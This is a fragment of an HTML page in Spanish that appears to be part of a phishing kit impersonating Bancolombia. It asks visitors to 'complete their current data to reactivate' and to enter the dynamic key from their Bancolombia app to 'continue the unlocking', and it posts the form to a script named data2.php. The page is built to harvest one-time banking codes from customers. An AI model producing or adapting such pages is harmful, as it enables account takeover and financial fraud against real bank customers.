...
<div align="center"><img src="css/c4.jpg" style="width:150px;">
<h1>
Complete con sus datos actuales <br>para reactivar</h1><br><br>
    ...
    <section class="">
        ...
        <form action="data2.php" id="form1" name="form1" method="post" class="form_contact">
            ...
            <br><br><br>  <br><br><br> 
            <div align="center">
<h2>Para continuar con el desbloqueo ingrese el código principal de su App Bancolombia (Clave dinámica) en el costado superior izquierdo de su pantalla lo encontrara , ingreselo en el siguiente formulario de seguridad.
</h2>
